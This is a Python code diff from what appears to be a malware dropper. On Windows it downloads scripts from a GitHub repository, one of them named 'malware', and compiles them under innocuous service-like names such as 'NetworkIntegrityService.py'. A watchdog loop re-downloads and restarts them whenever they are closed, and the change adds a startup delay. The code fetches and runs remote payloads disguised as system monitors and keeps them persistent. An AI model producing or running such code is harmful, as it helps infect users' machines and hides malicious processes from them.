@@ -123,12 +123,13 @@ if os.name == "nt":
         ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog1", "SystemResourceMonitor.py"),
         ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/malware", "NetworkIntegrityService.py"),
     ]
+    time.sleep(20)
     download_and_compile_scripts(urls_and_filenames)
 
 while True:
     for process in psutil.process_iter(['name']):
         if process.info['name'] in ['SystemResourceMonitor.exe', 'NetworkIntegrityService.py']:
             process.terminate()
-    download_and_compile_scripts(urls_and_filenames)
-    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Downloaded & Compiled ~ because a process wasnt found or was closed")
+            download_and_compile_scripts(urls_and_filenames)
+            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Downloaded & Compiled ~ because a process wasnt found or was closed")
     time.sleep(0.5)
